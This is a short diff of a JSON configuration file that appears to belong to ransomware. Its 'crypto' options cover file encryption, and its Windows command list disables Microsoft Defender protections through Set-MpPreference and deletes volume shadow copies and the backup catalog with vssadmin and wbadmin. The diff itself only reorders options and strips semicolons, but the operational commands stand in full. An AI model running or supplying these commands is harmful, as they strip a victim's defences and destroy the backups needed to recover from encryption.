@@ -11,9 +11,9 @@
 	"crypto": {
 		"opts": {
 			"transaction_db": true,
-			"hidden": false,
-			"simulation": false,
 			"everything": true,
+			"simulation": false,
+			"hidden": false,
 			"custom_icon": true,
 			"db": false,
 			"delay": {
@@ -155,11 +155,11 @@
 	"commands": {
 		"windows": {
 			"windef": [
-				"Set-MpPreference -DisableRealtimeMonitoring $true;",
-				"Set-MpPreference -SubmitSamplesConsent 0;",
-				"Set-MpPreference -DisableAutoExclusions $true;",
-				"Set-MpPreference -EnableControlledFolderAccess 0;",
-				"Set-MpPreference -MAPSReporting Disabled;"
+				"Set-MpPreference -DisableRealtimeMonitoring $true",
+				"Set-MpPreference -SubmitSamplesConsent 0",
+				"Set-MpPreference -DisableAutoExclusions $true",
+				"Set-MpPreference -EnableControlledFolderAccess 0",
+				"Set-MpPreference -MAPSReporting Disabled"
 			],
 			"shadows": "vssadmin Delete Shadows /All /Quiet",
 			"catalog": "wbadmin delete catalog -quiet",
